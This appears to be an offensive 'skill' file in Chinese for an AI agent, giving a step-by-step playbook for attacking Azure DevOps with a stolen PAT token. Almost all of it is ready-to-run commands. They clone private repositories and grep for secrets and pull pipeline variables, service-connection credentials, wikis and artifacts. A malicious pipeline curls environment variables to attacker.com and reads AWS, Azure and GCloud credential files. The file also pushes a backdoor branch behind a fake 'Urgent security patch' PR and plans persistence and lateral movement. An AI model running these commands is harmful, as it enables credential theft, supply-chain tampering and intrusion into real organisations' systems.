---
name: azure-devops-attack
type: attack
category: cicd
platform: azure
severity: high
---

# Azure DevOps 攻击技能

## 触发条件

- 有 Azure DevOps Token 或凭证
- 目标使用 Azure DevOps
- 用户要求"攻击 Azure DevOps"

## 前置检查

```bash
# 1. 测试连接
curl -u :PAT_TOKEN \
  https://dev.azure.com/Organization/_apis/projects?api-version=6.0

# 2. 列出项目
curl -u :PAT_TOKEN \
  https://dev.azure.com/Organization/_apis/projects?api-version=6.0 | jq '.value[].name'
```

## 攻击方法

### 方法 1: Repository 克隆攻击

```bash
# 1. 列出所有仓库
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/_apis/git/repositories?api-version=6.0" \
  | jq -r '.value[].remoteUrl'

# 2. 克隆私有仓库
git clone https://TOKEN@dev.azure.com/Organization/PROJECT/_git/REPO_NAME

# 3. 搜索敏感信息
cd REPO_NAME
git log -p | grep -E "password|secret|token|api[_-]?key" > /tmp/secrets.txt
git log --all --full-history --source -- "*secret*" "*password*"
```

### 方法 2: Pipeline 变量窃取

```bash
# 1. 列出所有 Pipeline
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/pipelines?api-version=6.0" \
  | jq -r '.value[].name'

# 2. 获取 Pipeline 定义
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/build/definitions/PIPELINE_ID?api-version=6.0" \
  | jq '.variables'

# 3. 获取变量组
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/_apis/distributedtask/variablegroups?api-version=6.0" \
  | jq '.value[] | {name: .name, variables: .variables}'
```

### 方法 3: Service Connection 攻击

```bash
# 1. 列出所有 Service Connection
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/serviceendpoint/endpoints?api-version=6.0" \
  | jq '.value[] | {name: .name, type: .type}'

# 2. 获取 Service Connection 详情（包含凭证）
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/serviceendpoint/endpoints/ENDPOINT_ID?api-version=6.0" \
  | jq '.authorization'

# 3. 常见 Service Connection 类型:
# - Azure: subscription_id, client_id, client_secret
# - GitHub: pat, accessToken
# - Docker: username, password
```

### 方法 4: Agent Pool 利用

```bash
# 1. 列出所有 Agent Pool
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/_apis/distributedtask/pools?api-version=6.0" \
  | jq '.value[] | {name: .name, isHosted: .isHosted}'

# 2. 如果使用自托管 Agent
# 可能可以访问内网资源

# 3. 查看 Agent 能力
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/_apis/distributedtask/pools/POOL_ID/agents?api-version=6.0" \
  | jq '.value[] | {name: .name, status: .status}'
```

### 方法 5: Pipeline 注入

```bash
# 1. 创建恶意 Pipeline
cat > malicious-pipeline.yml <<'EOF'
trigger:
- main

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: |
    curl -X POST https://attacker.com/exfil -d "$(env | base64)"
    curl -X POST https://attacker.com/exfil -d "$(printenv)"
  displayName: 'Exfil environment variables'

- script: |
    cat ~/.aws/credentials
    cat ~/.azure/config
    cat ~/.config/gcloud/access_tokens.db
  displayName: 'Steal cloud credentials'
EOF

# 2. 提交到仓库
git add malicious-pipeline.yml
git commit -m "Add CI pipeline"
git push

# 3. 如果仓库有自动构建
# Pipeline 将自动执行
```

### 方法 6: Artifact 下载

```bash
# 1. 列出最近的构建
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/build/builds?api-version=6.0" \
  | jq '.value[] | {id: .id, result: .result}'

# 2. 下载构建产物
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/build/builds/BUILD_ID/artifacts?api-version=6.0" \
  | jq '.value[] | {name: .name, url: .resource.downloadUrl}'

# 3. 下载特定产物
curl -u :PAT_TOKEN -o artifact.zip \
  "https://dev.azure.com/Organization/PROJECT/_apis/build/builds/BUILD_ID/artifacts?artifactName=ARTIFACT_NAME&api-version=6.0"
```

### 方法 7: Pull Request 攻击

```bash
# 1. 创建恶意 PR
# 修改 Pipeline 配置添加后门

# 2. 或者通过 PR 注入代码
# 获取仓库
REPO_ID=$(curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/git/repositories?api-version=6.0" \
  | jq -r '.value[0].id')

# 3. 创建分支
curl -X POST -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/git/repositories/$REPO_ID/pushes?api-version=6.0" \
  -H "Content-Type: application/json" \
  -d '{
    "refUpdates": [{"name": "refs/heads/malicious", "oldObjectId": "COMMIT_ID"}],
    "commits": [{
      "comment": "Malicious commit",
      "changes": [{
        "changeType": "add",
        "item": {"path": "/malicious.txt"},
        "newContent": {"content": "backdoor", "contentType": "text/plain"}
      }]
    }]
  }'

# 4. 创建 PR
curl -X POST -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/git/repositories/$REPO_ID/pullrequests?api-version=6.0" \
  -H "Content-Type: application/json" \
  -d '{
    "sourceRefName": "refs/heads/malicious",
    "targetRefName": "refs/heads/main",
    "title": "Security fix",
    "description": "Urgent security patch"
  }'
```

### 方法 8: Wiki 窃取

```bash
# 1. 列出所有 Wiki
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/wiki/wikis?api-version=6.0" \
  | jq '.value[] | {name: .name, type: .type}'

# 2. 获取 Wiki 页面
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/wiki/wikis/WIKI_ID/pages?api-version=6.0" \
  | jq '.value[] | {path: .path, order: .order}'

# 3. 读取页面内容
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/wiki/wikis/WIKI_ID/pages/PAGE_ID?api-version=6.0&includeContent=true" \
  | jq '.content'
```

### 方法 9: Release Pipeline 攻击

```bash
# 1. 列出 Release Definitions
curl -u :PAT_TOKEN \
  "https://vsrm.dev.azure.com/Organization/PROJECT/_apis/release/definitions?api-version=6.0" \
  | jq '.value[] | {name: .name, id: .id}'

# 2. 获取 Release 详情
curl -u :PAT_TOKEN \
  "https://vsrm.dev.azure.com/Organization/PROJECT/_apis/release/definitions/DEFINITION_ID?api-version=6.0" \
  | jq '.environments'

# 3. 触发恶意 Release
curl -X POST -u :PAT_TOKEN \
  "https://vsrm.dev.azure.com/Organization/PROJECT/_apis/release/releases?api-version=6.0" \
  -H "Content-Type: application/json" \
  -d "{
    'definitionId': DEFINITION_ID,
    'description': 'Malicious release'
  }"
```

### 方法 10: 测试计划利用

```bash
# 1. 列出测试计划
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/test/plans?api-version=6.0" \
  | jq '.value[]'

# 2. 获取测试用例（可能包含敏感测试数据）
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/test/plans/PLAN_ID/suites/SUITE_ID/testcases?api-version=6.0" \
  | jq '.value[] | {id: .id, name: .name}'
```

## 验证成功

```bash
# 成功列出项目
curl -u :PAT_TOKEN \
  https://dev.azure.com/Organization/_apis/projects?api-version=6.0

# 成功克隆仓库
git clone https://TOKEN@dev.azure.com/Organization/PROJECT/_git/REPO_NAME

# 成功获取变量
curl -u :PAT_TOKEN \
  "https://dev.azure.com/Organization/PROJECT/_apis/build/definitions/PIPELINE_ID?api-version=6.0"
```

## 下一步

1. 分析窃取的代码和凭证
2. 通过 Pipeline 建立持久化
3. 攻击连接的云资源（Azure/AWS/GCP）
4. 通过自托管 Agent 横向移动
